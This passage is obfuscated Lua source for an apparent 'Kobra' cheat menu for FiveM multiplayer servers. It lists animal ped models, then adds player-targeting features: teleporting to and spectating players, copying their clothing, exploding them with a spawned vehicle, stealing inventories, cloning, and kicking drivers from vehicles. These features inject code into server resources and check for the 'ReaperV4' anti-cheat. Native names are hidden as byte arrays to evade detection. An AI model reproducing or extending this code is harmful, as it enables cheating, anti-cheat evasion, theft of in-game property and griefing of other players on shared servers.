                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v361));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v362=nil;for v500,v501 in pairs(v15) do if v501 then v362=v500;break;end end if v362 then local v555=0;local v556;local v557;local v558;local v559;while true do if (v555==(1 -0)) then v557=GetPlayerPed(v556);v558=GetEntityCoords(v557);v555=135 -(98 + 35) ;end if (v555==0) then v556=GetPlayerFromServerId(v362);if ((v556== -(1 + 0)) or  not DoesEntityExist(GetPlayerPed(v556))) then local v950=0;while true do if (v950==(0 -0)) then v249:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",10096 -7096 );v15[v362]=nil;v950=1;end if (v950==(1 + 0)) then v0:UpdateListMenu();return;end end end v555=1 + 0 ;end if (3==v555) then SetEntityHeading(PlayerPedId(),v559);v249:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v362)),v362),1314 + 1686 );break;end if (v555==2) then v559=GetEntityHeading(v557);SetEntityCoords(PlayerPedId(),v558.x,v558.y,v558.z,false,false,false,false);v555=3;end end else v249:Notify("error","Kobra","You must select a player to do this!",3557 -(395 + 162) );end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v363) local v364=0 + 0 ;local v365;while true do if (0==v364) then v365=nil;for v741,v742 in pairs(v15) do if v742 then v365=v741;break;end end v364=1942 -(816 + 1125) ;end if ((1 -0)==v364) then v249:HandleSpectateToggle(v365,v363);break;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v366={};for v502,v503 in pairs(v15) do if v503 then v366[ #v366 + (1 -0) ]=v502;end end if ( #v366==0) then local v560=0 -0 ;while true do if (v560==(1341 -(391 + 950))) then v249:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end local v367=v366[2 -1 ];local v368=GetResourceState("ReaperV4")=="started" ;if v368 then MachoInjectThread(0 -0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v367));else local v561=0;local v562;local v563;local v564;local v565;local v566;while true do if (v561==(4 -2)) then v566=nil;function v566(v831) local v832=0 + 0 ;local v833;local v834;local v835;while true do if (v832==(2 + 0)) then if (v564(v562("DoesEntityExist"))(v834) and v564(v562("DoesEntityExist"))(v835)) then local v1177=0 -0 ;while true do if (v1177==(1525 -(251 + 1271))) then v564(v562("SetPedPropIndex"))(v835,2 + 0 ,v564(v562("GetPedPropIndex"))(v834,5 -3 ),v564(v562("GetPedPropTextureIndex"))(v834,4 -2 ),true);print("^2[Kobra] Clothing copied successfully!^0");break;end if (v1177==2) then v564(v562("SetPedComponentVariation"))(v835,17 -6 ,v564(v562("GetPedDrawableVariation"))(v834,11),v564(v562("GetPedTextureVariation"))(v834,1270 -(1147 + 112) ),0);v564(v562("SetPedPropIndex"))(v835,0 + 0 ,v564(v562("GetPedPropIndex"))(v834,0),v564(v562("GetPedPropTextureIndex"))(v834,0),true);v564(v562("SetPedPropIndex"))(v835,1 -0 ,v564(v562("GetPedPropIndex"))(v834,1 + 0 ),v564(v562("GetPedPropTextureIndex"))(v834,1),true);v1177=700 -(335 + 362) ;end if (v1177==(1 + 0)) then v564(v562("SetPedComponentVariation"))(v835,5 -1 ,v564(v562("GetPedDrawableVariation"))(v834,10 -6 ),v564(v562("GetPedTextureVariation"))(v834,14 -10 ),0 -0 );v564(v562("SetPedComponentVariation"))(v835,16 -10 ,v564(v562("GetPedDrawableVariation"))(v834,572 -(237 + 329) ),v564(v562("GetPedTextureVariation"))(v834,21 -15 ),0);v564(v562("SetPedComponentVariation"))(v835,8,v564(v562("GetPedDrawableVariation"))(v834,6 + 2 ),v564(v562("GetPedTextureVariation"))(v834,8),0 + 0 );v1177=2;end if (v1177==(1124 -(408 + 716))) then print("^2[Kobra] Copying clothing from Server ID: "   .. v831   .. "^0" );v564(v562("SetPedComponentVariation"))(v835,1,v564(v562("GetPedDrawableVariation"))(v834,3 -2 ),v564(v562("GetPedTextureVariation"))(v834,822 -(344 + 477) ),0);v564(v562("SetPedComponentVariation"))(v835,1 + 2 ,v564(v562("GetPedDrawableVariation"))(v834,1764 -(1188 + 573) ),v564(v562("GetPedTextureVariation"))(v834,7 -4 ),0 + 0 );v1177=3 -2 ;end end else print("^3[WARNING] Target or local ped does not exist.^0");end break;end if (v832==(0 -0)) then v833=v565(v831);if (v833== -(2 -1)) then print("^1[ERROR] Client ID not found for Server ID: "   .. v831   .. "^0" );return;end v832=1530 -(508 + 1021) ;end if (v832==(1 + 0)) then v834=v564(v562("GetPlayerPed"))(v833);v835=v564(v562("PlayerPedId"))();v832=1168 -(228 + 938) ;end end end v566(v367);break;end if (v561==(686 -(332 + 353))) then v564=nil;function v564(v836) local v837=0 -0 ;local v838;local v839;while true do if (v837==(0 -0)) then v838=v563(v836);v839=_G[v838];v837=1 + 0 ;end if (v837==1) then return v839;end end end v565=nil;function v565(v840) local v841=0 + 0 ;local v842;while true do if (v841==(0 -0)) then v842=v564(v562("GetActivePlayers"))();for v1083,v1084 in ipairs(v842) do if (v564(v562("GetPlayerServerId"))(v1084)==v840) then return v1084;end end v841=424 -(18 + 405) ;end if ((1 + 0)==v841) then return  -(1 + 0);end end end v561=2 -0 ;end if (v561==0) then v562=nil;function v562(v843) local v844={};for v951=979 -(194 + 784) , #v843 do v844[v951]=string.byte(v843,v951);end return v844;end v563=nil;function v563(v845) local v846=1770 -(694 + 1076) ;local v847;while true do if (v846==1) then return v847;end if (v846==0) then v847="";for v1085=1905 -(122 + 1782) , #v845 do v847=v847   .. string.char(v845[v1085]) ;end v846=1 + 0 ;end end end v561=1 + 0 ;end end end v249:Notify("success","Kobra","Copied clothing!",4501 + 499 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v369=0;local v370;while true do if (v369==(0 -0)) then v370={};for v743,v744 in pairs(v15) do if v744 then v370[ #v370 + 1 + 0 ]=v743;end end v369=1;end if (v369==(1971 -(214 + 1756))) then if ( #v370==(0 -0)) then local v801=0 + 0 ;while true do if (v801==(0 + 0)) then v249:Notify("error","Kobra","You must select a player to do this!",3585 -(217 + 368) );return;end end end v249:HandleLaunchPlayer(v370);v369=2;end if (v369==(5 -3)) then v249:Notify("success","Kobra","Attempting to TEST",5000);break;end end end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v371=0 + 0 ;local v372;while true do if (v371==1) then if ( #v372==(889 -(844 + 45))) then local v802=284 -(242 + 42) ;while true do if (v802==(0 -0)) then v249:Notify("error","Kobra","You must select a player to do this!",6974 -3974 );return;end end end for v745,v746 in ipairs(v372) do local v747=1200 -(132 + 1068) ;local v748;local v749;while true do if (v747==0) then v748=v746;v749=GetPlayerFromServerId(v746);v747=1 -0 ;end if (v747==(1624 -(214 + 1409))) then if ((v749== -1) or  not DoesEntityExist(GetPlayerPed(v749))) then local v1066=0;while true do if (v1066==(0 + 0)) then v249:Notify("error","Kobra","You must select a player to do this!",3000);v15[v746]=nil;v1066=1635 -(497 + 1137) ;end if (v1066==(941 -(9 + 931))) then return;end end else local v1067=0;local v1068;while true do if (v1067==(289 -(181 + 108))) then v1068=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v748)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v1068,v748);v1067=1 + 0 ;end if ((2 -1)==v1067) then v249:Notify("success","Kobra","Attempting to Explode Player",14849 -9849 );break;end end end break;end end end v371=1 + 1 ;end if (v371==(2 + 0)) then v0:UpdateListMenu();break;end if (v371==0) then v372={};for v750,v751 in pairs(v15) do if v751 then v372[ #v372 + (477 -(296 + 180)) ]=v750;end end v371=1;end end end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v373={};for v504,v505 in pairs(v15) do if v505 then v373[ #v373 + 1 ]=v504;end end if ( #v373==(1265 -(1037 + 228))) then local v567=0;while true do if ((0 -0)==v567) then v249:Notify("error","Kobra","You must select a player to do this!",8645 -5645 );return;end end end v249:HandleTakeInventory(v373);v249:Notify("success","Kobra","Attempting to steal inventory",5000);end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v374=527 -(187 + 340) ;local v375;while true do if ((1872 -(1298 + 572))==v374) then v249:Notify("success","Kobra","Cloned Player",12434 -7434 );break;end if (v374==(170 -(144 + 26))) then v375={};for v752,v753 in pairs(v15) do if v753 then v375[ #v375 + (2 -1) ]=v752;end end v374=2 -1 ;end if (v374==1) then if ( #v375==0) then local v803=0 + 0 ;while true do if (v803==(0 -0)) then v249:Notify("error","Kobra","You must select a player to do this!",6964 -3964 );return;end end end v249:HandleClonePlayer(v375);v374=9 -7 ;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v376=0 -0 ;local v377;while true do if (v376==(2 + 0)) then v249:Notify("success","Kobra","Cloned Player",1872 + 3128 );break;end if (v376==(202 -(5 + 197))) then v377={};for v754,v755 in pairs(v15) do if v755 then v377[ #v377 + 1 ]=v754;end end v376=1;end if (v376==(687 -(339 + 347))) then if ( #v377==(0 -0)) then v249:Notify("error","Kobra","You must select a player to do this!",10565 -7565 );return;end v249:HandleAttackClonePlayer(v377);v376=378 -(365 + 11) ;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=3 -2 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v378) local v379={};for v506,v507 in pairs(v15) do if v507 then v379[ #v379 + 1 ]=v506;end end if ( #v379==(0 + 0)) then local v568=0 + 0 ;while true do if (v568==0) then v249:Notify("error","Kobra","You must select a player to do this!",1566 + 1434 );return;end end end v0:AttachSelectedVehicle(v379,v378);v249:Notify("success","Kobra","Vehicle Attached to "   ..  #v379   .. " Player(s)" ,5000);end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1370 -(618 + 751) ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v380) local v381={};for v508,v509 in pairs(v15) do if v509 then v381[ #v381 + 1 ]=v508;end end if ( #v381==(0 -0)) then local v569=0 + 0 ;while true do if (v569==(0 + 0)) then v249:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v0.GetSelectedObjectModel=function(v510) return v380;end;v0:SpawnSelectedObject(v381);end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1245 -(334 + 910) ,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v383) local v384=0 + 0 ;local v385;while true do if (v384==(1214 -(615 + 597))) then v0:SpawnSelectedObject(v385);v249:Notify("success","Kobra","Spawned object '"   .. tostring(v383)   .. "' for "   ..  #v385   .. " player(s)." ,4474 + 526 );break;end if (v384==(0 -0)) then v385={};for v756,v757 in pairs(v15) do if v757 then v385[ #v385 + 1 + 0 ]=v756;end end v384=1 + 0 ;end if (v384==(1 + 0)) then if ( #v385==(1899 -(1056 + 843))) then local v804=0 -0 ;while true do if (v804==0) then v249:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v0.GetSelectedObjectModel=function(v758) return v383;end;v384=2 -0 ;end end end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v386) local v387=0;local v388;while true do if (v387==(1913 -(1680 + 231))) then v0:SpawnSelectedObject(v388);break;end if (v387==(0 + 0)) then v388={};for v759,v760 in pairs(v15) do if v760 then v388[ #v388 + 1 + 0 ]=v759;end end v387=1;end if (v387==1) then if ( #v388==(1149 -(212 + 937))) then local v805=0 + 0 ;while true do if (0==v805) then v249:Notify("error","Kobra","You must select at least one player!",4062 -(111 + 951) );return;end end end v0.GetSelectedObjectModel=function(v761) return v386;end;v387=1 + 1 ;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v389) local v390=1817 -(348 + 1469) ;local v391;while true do if (v390==(1289 -(1115 + 174))) then v391={};for v762,v763 in pairs(v15) do if v763 then v391[ #v391 + (2 -1) ]=v762;end end v390=1;end if ((1015 -(85 + 929))==v390) then if ( #v391==(0 + 0)) then local v806=1867 -(1151 + 716) ;while true do if ((0 + 0)==v806) then v249:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v0.GetSelectedObjectModel=function(v764) return v389;end;v390=2;end if (v390==(2 + 0)) then v0:SpawnSelectedObject(v391);v249:Notify("success","Kobra","Spawned object '"   .. tostring(v389)   .. "' for "   ..  #v391   .. " player(s)." ,6704 -(95 + 1609) );break;end end end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v392=nil;for v511,v512 in pairs(v15) do if v512 then v392=v511;break;end end if v392 then local v570=0;local v571;while true do if (v570==(759 -(364 + 394))) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v571))) then v249:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",2719 + 281 );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1000=1 + 0 ,2 do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v571))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v570=1 + 1 ;end if ((2 + 0)==v570) then v15[v392]=true;v249:UpdateListMenu();break;end if (v570==(0 + 0)) then v571=GetPlayerFromServerId(v392);if (v571== -(1 + 0)) then local v953=0 + 0 ;while true do if (v953==(0 + 0)) then v249:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",947 + 2053 );v15[v392]=nil;v953=957 -(719 + 237) ;end if (v953==(2 -1)) then v0:UpdateListMenu();return;end end end v570=1;end end else v249:Notify("error","Kobra","You must select a player to do this!",2477 + 523 );end end},{type="button",label="Teleport to Ocean",onSelect=function() local v393=nil;for v513,v514 in pairs(v15) do if v514 then v393=v513;break;end end if v393 then local v572=0 -0 ;local v573;while true do if ((0 -0)==v572) then v573=GetPlayerFromServerId(v393);if (v573== -(2 -1)) then local v954=0;while true do if (v954==(1992 -(761 + 1230))) then v0:UpdateListMenu();return;end if (v954==(193 -(80 + 113))) then v249:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",1632 + 1368 );v15[v393]=nil;v954=1 + 0 ;end end end v572=1 + 0 ;end if ((7 -5)==v572) then v15[v393]=true;v249:UpdateListMenu();break;end if (v572==1) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v573))) then v249:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",3000);return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1001=1 + 0 ,1 + 1  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
